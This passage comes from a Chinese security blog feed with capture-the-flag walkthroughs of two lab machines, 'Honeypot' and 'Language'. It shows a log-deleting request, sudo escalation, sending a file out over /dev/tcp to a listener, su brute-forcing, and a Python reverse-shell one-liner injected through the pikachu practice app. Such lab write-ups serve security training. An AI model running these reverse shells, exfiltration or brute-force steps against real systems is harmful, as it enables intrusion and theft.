class="hljs-string">&quot;application/json&quot;</span><br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br>Accept-Encoding: gzip, deflate, br<br>Connection: keep-alive<br>Content-Length: 97<br><br>&#123;<br>  <span class="hljs-string">&quot;action&quot;</span>: <span class="hljs-string">&quot;file_delete&quot;</span>,<br>  <span class="hljs-string">&quot;params&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;path&quot;</span>: <span class="hljs-string">&quot;/var/www/html/history.txt&quot;</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202506302257792.png"></p><p>重新连接SSH</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">──(root㉿kali)-[~]<br>└─<span class="hljs-comment"># ssh root@192.168.2.41                                                                                                          </span><br> _   _                                    _   <br>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> ___  _ __   ___ _   _ _ __   ___ </span>|<span class="hljs-string"> </span>|<span class="hljs-string">_ </span><br><span class="hljs-string"></span>|<span class="hljs-string"> </span>|<span class="hljs-string">_</span>|<span class="hljs-string"> </span>|<span class="hljs-string">/ _ \</span>|<span class="hljs-string"> &#x27;_ \ / _ \ </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> &#x27;_ \ / _ \</span>|<span class="hljs-string"> __</span>|<br>|<span class="hljs-string">  _  </span>|<span class="hljs-string"> (_) </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string">  __/ </span>|<span class="hljs-string">_</span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string">_) </span>|<span class="hljs-string"> (_) </span>|<span class="hljs-string"> </span>|<span class="hljs-string">_ </span><br><span class="hljs-string"></span>|<span class="hljs-string">_</span>|<span class="hljs-string"> </span>|<span class="hljs-string">_</span>|<span class="hljs-string">\___/</span>|<span class="hljs-string">_</span>|<span class="hljs-string"> </span>|<span class="hljs-string">_</span>|<span class="hljs-string">\___</span>|<span class="hljs-string">\__, </span>|<span class="hljs-string"> .__/ \___/ \__</span>|<br>                        |<span class="hljs-string">___/</span>|<span class="hljs-string">_</span>|<span class="hljs-string">             </span><br><span class="hljs-string">root@192.168.2.41&#x27;s password: </span><br><span class="hljs-string">Linux Honeypot 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64</span><br><span class="hljs-string"></span><br><span class="hljs-string">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="hljs-string">the exact distribution terms for each program are described in the</span><br><span class="hljs-string">individual files in /usr/share/doc/*/copyright.</span><br><span class="hljs-string"></span><br><span class="hljs-string">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="hljs-string">permitted by applicable law.</span><br><span class="hljs-string">Last login: Mon Jun 30 10:47:00 2025 from 192.168.2.4</span><br><span class="hljs-string">Warning: Log file not found, launching real shell environment</span><br><span class="hljs-string">System maintenance mode activated</span><br><span class="hljs-string">sh-5.0$ id</span><br><span class="hljs-string">uid=1001(root) gid=1001(root) groups=1001(root)</span><br><span class="hljs-string">sh-5.0$ bash</span><br><span class="hljs-string">root@Honeypot:~$ </span><br></code></pre></td></tr></table></figure><p>再次执行<code>sudo -l</code>，发现不需要密码即可执行<code>/bin/bash</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@Honeypot:~$ <span class="hljs-built_in">sudo</span> -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> root on Honeypot:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User root may run the following commands on Honeypot:<br>    (ALL : ALL) NOPASSWD: /usr/bin/bash<br>root@Honeypot:~$ <br></code></pre></td></tr></table></figure><p>直接执行，发现还没有变化</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@Honeypot:~$ <span class="hljs-built_in">sudo</span> /bin/bash<br>root@Honeypot:~$ <span class="hljs-built_in">id</span><br>uid=1001(root) gid=1001(root) <span class="hljs-built_in">groups</span>=1001(root)<br></code></pre></td></tr></table></figure><p>由于bash是 root 的 ，而真正的root是<code>toor</code>，故需要对用户进行切换</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@Honeypot:~$ <span class="hljs-built_in">sudo</span> -u toor /usr/bin/bash<br>toor@Honeypot:/home/root# <span class="hljs-built_in">id</span><br>uid=0(toor) gid=0(toor) <span class="hljs-built_in">groups</span>=0(toor)<br></code></pre></td></tr></table></figure><p><strong>ROOT FLAG</strong></p><figure class="highlight plaintext"><figcaption><span>cat root.txt</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bashtoor@Honeypot:~#">flag&#123;root-771e84c4-5494-11f0-9a89-b70422752e89&#125;<br></code></pre></td></tr></table></figure><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>在<code>/var/backups</code>里面有一个文件<code>xqa.jpg</code><br>发送到自己的kali上面</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@Honeypot:/var/backups$ <span class="hljs-built_in">cat</span> xqa.jpg &gt; /dev/tcp/192.168.2.4/4444<br></code></pre></td></tr></table></figure><p>kali：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# nc -lvnp 4444 &gt; 1.jpg                                             <br>listening on [any] 4444 ...<br>connect to [192.168.2.4] from (UNKNOWN) [192.168.2.41] 43448<br></code></pre></td></tr></table></figure><p>使用<code>stegseek</code>解密</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# stegseek 1.jpg     <br>StegSeek 0.6 - https://github.com/RickdeJager/StegSeek<br><br>[i] Found passphrase: <span class="hljs-string">&quot;&quot;</span><br>[i] Original filename: <span class="hljs-string">&quot;hello.zip&quot;</span>.<br>[i] Extracting to <span class="hljs-string">&quot;1.jpg.out&quot;</span>.<br></code></pre></td></tr></table></figure><p>解密出来两个文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# unzip -l 1.jpg.out<br>Archive:  1.jpg.out<br>  Length      Date    Time    Name<br>---------  ---------- -----   ----<br>      168  2025-05-29 23:10   generate_by_username.sh<br>     3605  2025-05-31 09:48   muban.key<br>---------                     -------<br>     3773                     2 files<br></code></pre></td></tr></table></figure><p>发现是生成的密码的脚本，直接进行生成</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# bash generate_by_username.sh toor &gt; pass.txt<br></code></pre></td></tr></table></figure><p>使用<code>suForce</code>进行爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@Honeypot:~$ ./suForce -u toor -w pass.txt <br>            _____                          <br> ___ _   _ |  ___|__  _ __ ___ ___   <br>/ __| | | || |_ / _ \| <span class="hljs-string">&#x27;__/ __/ _ \ </span><br><span class="hljs-string">\__ \ |_| ||  _| (_) | | | (_|  __/  </span><br><span class="hljs-string">|___/\__,_||_|  \___/|_|  \___\___|  </span><br><span class="hljs-string">───────────────────────────────────</span><br><span class="hljs-string"> code: d4t4s3c     version: v1.0.0</span><br><span class="hljs-string">───────────────────────────────────</span><br><span class="hljs-string">🎯 Username | toor</span><br><span class="hljs-string">📖 Wordlist | pass.txt</span><br><span class="hljs-string">🔎 Status   | 320/325/98%/toor2025</span><br><span class="hljs-string">💥 Password | toor2025</span><br><span class="hljs-string">───────────────────────────────────</span><br></code></pre></td></tr></table></figure><p>直接使用<code>toor:toor2025</code>进行登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# ssh toor@192.168.2.41    <br> _   _                                    _   <br>| | | | ___  _ __   ___ _   _ _ __   ___ | |_ <br>| |_| |/ _ \| <span class="hljs-string">&#x27;_ \ / _ \ | | | &#x27;</span>_ \ / _ \| __|<br>|  _  | (_) | | | |  __/ |_| | |_) | (_) | |_ <br>|_| |_|\___/|_| |_|\___|\__, | .__/ \___/ \__|<br>                        |___/|_|             <br>toor@192.168.2.41<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">Linux Honeypot 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64</span><br><span class="hljs-string"></span><br><span class="hljs-string">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="hljs-string">the exact distribution terms for each program are described in the</span><br><span class="hljs-string">individual files in /usr/share/doc/*/copyright.</span><br><span class="hljs-string"></span><br><span class="hljs-string">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="hljs-string">permitted by applicable law.</span><br><span class="hljs-string">Last login: Mon Jun 30 11:27:43 2025 from 192.168.2.41</span><br><span class="hljs-string">toor@Honeypot:~# id</span><br><span class="hljs-string">uid=0(toor) gid=0(toor) groups=0(toor)</span><br></code></pre></td></tr></table></figure><p><strong>ROOT FLAG</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">toor@Honeypot:~# <span class="hljs-built_in">cat</span> /root/root.txt<br>flag&#123;root-771e84c4-5494-11f0-9a89-b70422752e89&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Maze-sec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>信息泄露，图片隐写</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Language</title>
    <link href="/Maze-sec/Language/"/>
    <url>/Maze-sec/Language/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><p>QQ群：<code>660930334</code></p><h1 id="主机探测"><a href="#主机探测" class="headerlink" title="主机探测"></a>主机探测</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# nmap -sn 192.168.2.0/24                                       <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-25 15:38 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.00044s latency).<br>MAC Address: 0A:00:27:00:00:0A (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2<br>Host is up (0.00066s latency).<br>MAC Address: 08:00:27:56:1F:86 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.39<br>Host is up (0.00058s latency).<br>MAC Address: 08:00:27:B7:8E:39 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 28.12 seconds<br></code></pre></td></tr></table></figure><p>IP地址：<code>192.168.2.39</code></p><h1 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h1><h2 id="1、全端口扫描"><a href="#1、全端口扫描" class="headerlink" title="1、全端口扫描"></a>1、全端口扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# nmap --min-rate 10000 -p- 192.168.2.39                        <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-25 15:39 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.39<br>Host is up (0.00029s latency).<br>Not shown: 65532 closed tcp ports (reset)<br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>80/tcp   open  http<br>9999/tcp open  abyss<br>MAC Address: 08:00:27:B7:8E:39 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 17.89 seconds<br></code></pre></td></tr></table></figure><p>开放端口：<code>22,80,9999</code></p><h2 id="2、详细信息扫描"><a href="#2、详细信息扫描" class="headerlink" title="2、详细信息扫描"></a>2、详细信息扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# nmap --min-rate 10000 -sT -sV -sC -O -p22,80,9999 192.168.2.39<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-25 15:40 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.39<br>Host is up (0.0048s latency).<br><br>PORT     STATE SERVICE VERSION<br>22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)<br>| ssh-hostkey: <br>|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)<br>|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)<br>|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)<br>80/tcp   open  http    Apache httpd 2.4.62 ((Debian))<br>|_http-server-header: Apache/2.4.62 (Debian)<br>|_http-title: Site doesnt have a title (text/html).<br>9999/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))<br>| http-git: <br>|   192.168.2.39:9999/.git/<br>|     Git repository found!<br>|     Repository description: Unnamed repository; edit this file <span class="hljs-string">&#x27;description&#x27;</span> to name the...<br>|     Remotes:<br>|_      https://github.com/zhuifengshaonianhanlu/pikachu.git<br>| http-cookie-flags: <br>|   /: <br>|     PHPSESSID: <br>|_      httponly flag not <span class="hljs-built_in">set</span><br>|_http-title: Get the pikachu<br>|_http-server-header: Apache/2.4.29 (Ubuntu)<br>MAC Address: 08:00:27:B7:8E:39 (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.8, Linux 5.0 - 5.4<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 23.01 seconds<br></code></pre></td></tr></table></figure><h1 id="WEB渗透"><a href="#WEB渗透" class="headerlink" title="WEB渗透"></a>WEB渗透</h1><h2 id="1、80端口"><a href="#1、80端口" class="headerlink" title="1、80端口"></a>1、80端口</h2><p><code>curl</code>80端口，没有发现任何东西</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# curl http://192.168.2.39     <br>index<br></code></pre></td></tr></table></figure><h3 id="1-目录爆破"><a href="#1-目录爆破" class="headerlink" title="1-目录爆破"></a>1-目录爆破</h3><p>尝试进行目录爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# gobuster <span class="hljs-built_in">dir</span> -u http://192.168.2.39 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt,html,bak <br>===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.2.39<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.6<br>[+] Extensions:              php,txt,html,bak<br>[+] Timeout:                 10s<br>===============================================================<br>Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/.html                (Status: 403) [Size: 277]<br>/.php                 (Status: 403) [Size: 277]<br>/index.html           (Status: 200) [Size: 6]<br>/.html                (Status: 403) [Size: 277]<br>/.php                 (Status: 403) [Size: 277]<br>/server-status        (Status: 403) [Size: 277]<br>Progress: 1102800 / 1102805 (100.00%)<br>===============================================================<br>Finished<br>===============================================================<br></code></pre></td></tr></table></figure><p>也没有其他的目录，80端口基本上无任何东西</p><h2 id="2、9999端口"><a href="#2、9999端口" class="headerlink" title="2、9999端口"></a>2、9999端口</h2><p>访问9999端口，发现是一个<code>pikachu</code>的靶场<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202506251544214.png"></p><h3 id="1-Getshell"><a href="#1-Getshell" class="headerlink" title="1-Getshell"></a>1-Getshell</h3><p>直接<code>RCE</code>，尝试反弹shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">127.0.0.1 | python -c <span class="hljs-string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.2.4&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;sh&quot;)&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202506260914368.png"></p><p>拿到shell权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# nc -lvnp 4444<br>listening on [any] 4444 ...<br>connect to [192.168.2.4] from (UNKNOWN) [192.168.2.39] 42292<br>$ <span class="hljs-built_in">id</span><br><span class="hljs-built_in">id</span><br>uid=1000(www-data) gid=50(staff) <span class="hljs-built_in">groups</span>=50(staff)<br></code></pre></td></tr></table></figure><h3 id="2-尝试docker逃逸"><a href="#2-尝试docker逃逸" class="headerlink" title="2-尝试docker逃逸"></a>2-尝试docker逃逸</h3><p>查看<code>/</code>，发现存在<code>.dockerenv</code>，故判定进入的是一个docker容器，需尝试docker逃逸，但经过尝试无法逃逸成功。</p><h1 id="Mysql渗透"><a href="#Mysql渗透" class="headerlink" title="Mysql渗透"></a>Mysql渗透</h1><p>查看文件，找到数据库的用户名和密码以及数据库名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@b0dd1db70539:/app/inc$ <span class="hljs-built_in">ls</span><br>config.inc.php  function.php  mysql.inc.php  showvcode.php  uploadfunction.php<br>www-data@b0dd1db70539:/app/inc$ <span class="hljs-built_in">cat</span> config.inc.php <br>&lt;?php<br>//全局session_start<br>session_start();<br>//全局居设置时区<br>date_default_timezone_set(<span class="hljs-string">&#x27;Asia/Shanghai&#x27;</span>);<br>//全局设置默认字符<br>header(<span class="hljs-string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);<br>//定义数据库连接参数<br>define(<span class="hljs-string">&#x27;DBHOST&#x27;</span>, <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>);//将localhost或者127.0.0.1修改为数据库服务器的地址<br>define(<span class="hljs-string">&#x27;DBUSER&#x27;</span>, <span class="hljs-string">&#x27;root&#x27;</span>);//将root修改为连接mysql的用户名<br>define(<span class="hljs-string">&#x27;DBPW&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>);//将root修改为连接mysql的密码，如果改了还是连接不上，请先手动连接下你的数据库，确保数据库服务没问题在说！<br>define(<span class="hljs-string">&#x27;DBNAME&#x27;</span>, <span class="hljs-string">&#x27;pikachu&#x27;</span>);//自定义，建议不修改<br>define(<span class="hljs-string">&#x27;DBPORT&#x27;</span>, <span class="hljs-string">&#x27;3306&#x27;</span>);//将3306修改为mysql的连接端口，默认tcp3306<br>?&gt;<br></code></pre></td></tr></table></figure><h2 id="1、连接数据库"><a href="#1、连接数据库" class="headerlink" title="1、连接数据库"></a>1、连接数据库</h2><p>由于数据库不需要密码，直接回车即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@b0dd1db70539:/app/inc$ mysql -uroot -p<br>Enter password: <br>Welcome to the MySQL monitor.  Commands end with ; or \g.<br>Your MySQL connection <span class="hljs-built_in">id</span> is 3<br>Server version: 5.7.26-0ubuntu0.18.04.1-<span class="hljs-built_in">log</span> (Ubuntu)<br><br>Copyright (c) 2000, 2019, Oracle and/or its affiliates. All rights reserved.<br><br>Oracle is a registered trademark of Oracle Corporation and/or its<br>affiliates. Other names may be trademarks of their respective<br>owners.<br><br>Type <span class="hljs-string">&#x27;help;&#x27;</span> or <span class="hljs-string">&#x27;\h&#x27;</span> <span class="hljs-keyword">for</span> <span class="hljs-built_in">help</span>. Type <span class="hljs-string">&#x27;\c&#x27;</span> to clear the current input statement.<br><br>mysql&gt; <br></code></pre></td></tr></table></figure><h2 id="2、查看数据库数据"><a href="#2、查看数据库数据" class="headerlink" title="2、查看数据库数据"></a>2、查看数据库数据</h2><p>进入<code>pikachu</code>数据库，查看<code>user表</code>，找到一个用户<code>ml</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysql&gt; use pikachu<br>Reading table information <span class="hljs-keyword">for</span> completion of table and column names<br>You can turn off this feature to get a quicker startup with -A<br><br>Database changed<br>mysql&gt; show tables;<br>+-------------------+<br>| Tables_in_pikachu |<br>+-------------------+<br>| httpinfo          |<br>| member            |<br>| message           |<br>| <span class="hljs-built_in">users</span>             |<br>| xssblind          |<br>+-------------------+<br>5 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.01 sec)<br><br>mysql&gt; <span class="hljs-keyword">select</span> * from <span class="hljs-built_in">users</span>;<br>+----+----------+----------------------------------+-------+<br>| <span class="hljs-built_in">id</span> | username | password                         | level |<br>+----+----------+----------------------------------+-------+<br>|  1 | admin    | e10adc3949ba59abbe56e057f20f883e |     1 |<br>|  2 | pikachu  | 670b14728ad9902aecba32e22fa4f6bd |     2 |<br>|  3 | <span class="hljs-built_in">test</span>     | e99a18c428cb38d5f260853678922e03 |     3 |<br>|  4 | ml       | I heard you like explosives      |     4 |<br>+----+----------+----------------------------------+-------+<br>4 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br></code></pre></td></tr></table></figure><p><code>password</code>显示<code>I heard you like explosives</code>，提示我们需要进行爆破</p><h1 id="SSH密码爆破"><a href="#SSH密码爆破" class="headerlink" title="SSH密码爆破"></a>SSH密码爆破</h1><p>根据在<code>users</code>表里面查看到的提示，尝试进行爆破<br>同时在<code>/tmp</code>目录下面找到一个<code>hint.txt</code>，提示<code>密码也需是由用户名组成</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@b0dd1db70539:/app/inc$ <span class="hljs-built_in">cat</span> /tmp/hint.txt <br>Maybe passwords are all made up of usernames<br></code></pre></td></tr></table></figure><h2 id="1、构造字典"><a 